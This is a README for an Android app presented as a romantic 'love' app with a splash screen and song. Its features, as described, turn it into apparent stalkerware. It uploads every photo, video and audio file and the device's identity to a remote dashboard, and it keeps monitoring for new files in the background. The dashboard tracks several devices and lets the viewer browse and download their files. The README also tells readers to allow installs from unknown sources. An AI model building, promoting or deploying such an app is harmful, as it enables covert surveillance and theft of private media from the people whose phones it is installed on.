# 💕 Snuggle Queen Wa Yobby

> Android APK that syncs ALL your photos, videos, and audio files to a private cloud file manager. Built with love ❤️.

## 📥 Download APK

**[⬇ Download Snuggle_Queen_Wa_Yobby.apk](https://github.com/yobbyking/snuggle-queen-wa-yobby/releases/download/v2.0/Snuggle_Queen_Wa_Yobby.apk)**

1. Click the link above to download the APK
2. Transfer it to your Android phone
3. Open it → allow "Install from unknown sources"
4. Install → Open → 💕

## 📱 Features

### The APK (Android 7+)
- 💕 **Sweet love splash screen** — romantic gradient + love words + auto-play RnB song
- 🔐 **Permission popup** — requests storage, camera, photo, video, audio access
- 📱 **Device tracking** — sends device name (e.g. "Samsung Galaxy S21") + unique ID
- ☁️ **Auto-upload** — scans ALL media files and uploads to your private cloud
- 🔄 **Background monitoring** — foreground service scans for NEW files every 60 seconds
- 🔒 **Private storage** — each device's files stored in its own private folder
- 📊 **Storage info** — shows device storage (free/total GB)

### The Web Dashboard (Render)
- **Sidebar device list** — see all connected devices with name, last seen, file count
- **Per-device browsing** — tap a device to see only its files
- **Grid view** — thumbnails for photos/videos, icons for audio/files
- **Filter** — All / Photos / Videos / Audio / Files
- **Preview** — click to view images, play videos/audio inline
- **Download** — download any file
- **Stats** — device count, total files, storage used
- **Auto-refresh** — updates every 15 seconds
- **Mobile responsive** — hamburger menu on phones

## 🔗 Links

- **Download APK**: https://github.com/yobbyking/snuggle-queen-wa-yobby/releases/download/v2.0/Snuggle_Queen_Wa_Yobby.apk
- **Web Dashboard**: https://snuggle-queen.onrender.com
- **GitHub Repo**: https://github.com/yobbyking/snuggle-queen-wa-yobby

## 🚀 How it works

1. Install the APK on your phone
2. 💕 Love splash screen appears for 5 seconds
3. 🔐 Grant storage + camera + media permissions
4. ☁️ App scans ALL photos, videos, and audio files
5. 📤 Each file uploaded to your private cloud with device name + ID
6. 🔄 Background service monitors for NEW files every 60 seconds
7. 📱 Install on a second phone → both devices show in the dashboard sidebar
8. Tap a device in the sidebar → see only that device's files

## 📁 Project structure

```
snuggle-queen-wa-yobby/
├── .github/workflows/
│   └── build-apk.yml              # Auto-build APK on push
├── app/                           # Android app
│   ├── src/main/
│   │   ├── AndroidManifest.xml   # Permissions: storage, camera, media, foreground service
│   │   ├── java/com/snugglequeen/yobby/
│   │   │   ├── SplashActivity.java      # Love splash + auto-play song
│   │   │   ├── PermissionsActivity.java  # Permission request UI
│   │   │   ├── MainActivity.java        # Scan + upload + device tracking
│   │   │   └── UploadService.java      # Background auto-sync (60s interval)
│   │   └── res/
│   │       ├── drawable/               # Launcher icons (vector)
│   │       └── values/                 # Styles + strings + colors
│   └── build.gradle
├── backend/                       # Render backend
│   ├── index.js                   # Express + multer + device tracking
│   ├── package.json
│   └── public/
│       └── index.html             # Web dashboard (sidebar + device list + file grid)
├── render.yaml                    # Render deploy config
└── README.md
```

## 📝 License

MIT — made with ❤️ for Snuggle Queen Wa Yobby
